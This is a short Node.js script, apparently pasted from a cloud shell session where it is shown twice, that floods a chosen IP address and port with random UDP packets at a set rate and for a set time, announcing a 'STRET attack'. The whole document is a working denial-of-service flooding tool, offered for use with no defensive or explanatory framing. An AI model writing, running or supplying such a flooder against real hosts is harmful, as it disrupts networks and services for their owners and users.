const dgram = require('dgram');                             const fs = require('fs');                                   const crypto = require('crypto');                                                                                       if (process.argv.length <= 6) {                                 console.log("Usage: node udp_attack.js [TARGET_IP] [TARGET_PORT] [DURATION] [PACKET_SIZE] [RATE]");                     process.exit(-1);                                       }                                                                                                                       const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);               const duration = parseInt(process.argv[4]);                 const packetSize = parseInt(process.argv[5]);               const rate = parseInt(process.argv[6]); // Packets per second                                                                                                                       const client = dgram.createSocket('udp4');                  const startTime = Date.now();                                                                                           function generatePacket(size) {                                 const packet = crypto.randomBytes(size);                    return packet;                                          }                                                                                                                       function sendPackets() {                                        const packet = generatePacket(packetSize);                  const interval = 1000 / rate; // Interval in milliseconds                                                           
    const sendInterval = setInterval(() => {
        const now = Date.now();
        if (now - startTime > duration * 1000) {
            clearInterval(sendInterval);
            client.close();
            console.log('Finished sending packets.');
            return;
        }

        client.send(packet, 0, packet.length, targetPort, targetIp, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            }
        });
    }, interval);
}

console.log(`Starting STRET attack on UDP ${targetIp}:${targetPort} for ${duration} seconds with packet size ${packetSize} bytes at ${rate} packets per second`);
sendPackets();
oivvv902@cloudshell:~$ more udp.js
const dgram = require('dgram');
const fs = require('fs');
const crypto = require('crypto');

if (process.argv.length <= 6) {
    console.log("Usage: node udp_attack.js [TARGET_IP] [TARG
ET_PORT] [DURATION] [PACKET_SIZE] [RATE]");
    process.exit(-1);
}

const targetIp = process.argv[2];
const targetPort = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const packetSize = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]); // Packets per secon
d

const client = dgram.createSocket('udp4');
const startTime = Date.now();

function generatePacket(size) {
    const packet = crypto.randomBytes(size);
    return packet;
}

function sendPackets() {
    const packet = generatePacket(packetSize);
    const interval = 1000 / rate; // Interval in millisecond
s

    const sendInterval = setInterval(() => {
        const now = Date.now();
        if (now - startTime > duration * 1000) {
            clearInterval(sendInterval);
            client.close();
            console.log('Finished sending packets.');
            return;
        }

        client.send(packet, 0, packet.length, targetPort, ta
rgetIp, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            }
        });
    }, interval);
}

console.log(`Starting STRET attack on UDP ${targetIp}:${targ
etPort} for ${duration} seconds with packet size ${packetSiz
e} bytes at ${rate} packets per second`);
sendPackets();